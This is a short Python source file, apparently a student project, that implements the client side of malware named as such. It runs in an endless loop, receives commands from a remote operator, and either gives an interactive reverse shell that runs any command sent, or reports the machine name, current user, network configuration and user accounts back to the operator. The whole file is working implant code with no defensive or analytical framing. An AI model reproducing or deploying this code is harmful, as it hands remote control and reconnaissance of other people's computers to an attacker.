from Class_Projet import Malware
import os


def prog():
    malware = Malware()
    malware.start()

    choix = malware.receive()
    print(choix)

    if choix == "1":
        malware.send(os.getcwd() + "> ")
        cmd = malware.receive()
        while cmd != "quit" and cmd is not None:
            print(cmd)
            if cmd[:2] == "cd":
                os.chdir(cmd[3:])

            malware.rev_shell(cmd)
            malware.send("\n" + os.getcwd() + "> ")
            cmd = malware.receive()

    if choix == "2":
        print("Choix2")
        cmd = malware.receive()
        print(cmd)
        while cmd != "quit" and cmd is not None:
            if cmd == "computer":
                malware.send(os.environ["COMPUTERNAME"])
            elif cmd == "current":
                malware.rev_shell("whoami")
            elif cmd == "network":
                malware.rev_shell("ipconfig")
            elif cmd == "users":
                malware.rev_shell("net user")
            cmd = malware.receive()
    malware.quit()


while True:
    prog()
